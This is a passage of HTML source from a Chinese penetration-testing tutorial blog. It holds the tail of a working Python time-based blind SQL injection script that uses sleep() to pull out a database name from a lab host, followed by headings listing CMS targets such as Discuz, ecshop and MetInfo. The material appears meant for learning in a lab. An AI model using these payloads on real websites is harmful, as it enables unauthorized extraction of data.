class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">	<span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">		startTime2=time.time()</span><br><span class="line">		url2 = <span class="string">"http://192.168.37.147/pentest/test/time/?type=1 and if(substr(database(),'%d',1)='%s',sleep(5),1)"</span>%(d,payload)</span><br><span class="line">		response2 = requests.get(url2) <span class="comment">#发送请求</span></span><br><span class="line">		<span class="keyword">if</span> time.time() - startTime2 &gt; <span class="number">5</span>: <span class="comment">#判断是否延时了5秒 也就是 是否执行了函数sleep(5)</span></span><br><span class="line">			database+=payload</span><br><span class="line">			<span class="keyword">print</span> database</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"the database is "</span> + database</span><br></pre></td></tr></table></figure>
-<h3 id="实战练习-DZ论坛"><a href="#实战练习-DZ论坛" class="headerlink" title="实战练习:DZ论坛"></a>实战练习:DZ论坛</h3><p>dz7.2</p>
-<h3 id="实战练习-aspcms"><a href="#实战练习-aspcms" class="headerlink" title="实战练习:aspcms"></a>实战练习:aspcms</h3><h3 id="实战练习-phpmyadmin"><a href="#实战练习-phpmyadmin" class="headerlink" title="实战练习:phpmyadmin"></a>实战练习:phpmyadmin</h3><h3 id="实战练习-齐博系统"><a href="#实战练习-齐博系统" class="headerlink" title="实战练习:齐博系统"></a>实战练习:齐博系统</h3><h3 id="实战练习-海盗云商"><a href="#实战练习-海盗云商" class="headerlink" title="实战练习:海盗云商"></a>实战练习:海盗云商</h3><h3 id="实战练习-PHP168-6-0"><a href="#实战练习-PHP168-6-0" class="headerlink" title="实战练习:PHP168 6.0"></a>实战练习:PHP168 6.0</h3><h3 id="实战练习-ecshop"><a href="#实战练习-ecshop" class="headerlink" title="实战练习:ecshop"></a>实战练习:ecshop</h3><h3 id="实战练习-ShopXp系统v3-x"><a href="#实战练习-ShopXp系统v3-x" class="headerlink" title="实战练习:ShopXp系统v3.x"></a>实战练习:ShopXp系统v3.x</h3><h3 id="实战练习-Dcore-轻型CMS系统"><a href="#实战练习-Dcore-轻型CMS系统" class="headerlink" title="实战练习:Dcore(轻型CMS系统)"></a>实战练习:Dcore(轻型CMS系统)</h3><h3 id="实战练习-MetInfo-5-1-7"><a href="#实战练习-MetInfo-5-1-7" class="headerlink" title="实战练习:MetInfo 5.1.7"></a>实战练习:MetInfo 5.1.7</h3><h3 id="实战练习-Metinfo-5-3"><a href="#实战练习-Metinfo-5-3" class="headerlink" title="实战练习:Metinfo 5.3"></a>实战练习:Metinfo 5.3</h3><p><a href="http://www.wooyun.org/bugs/wooyun-2015-0119166" target="_blank" rel="noopener">MetInfo 5.3 /include/global/listmod.php SQL 注入漏洞</a>:</p>
-<h2 id="实战扩展"><a href="#实战扩展" class="headerlink" title="实战扩展"></a>实战扩展</h2><h2 id="漏洞知识"><a href="#漏洞知识" class="headerlink" title="漏洞知识"></a>漏洞知识</h2>
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透/">渗透</a></li></ul>
 
     </footer>
   </div>
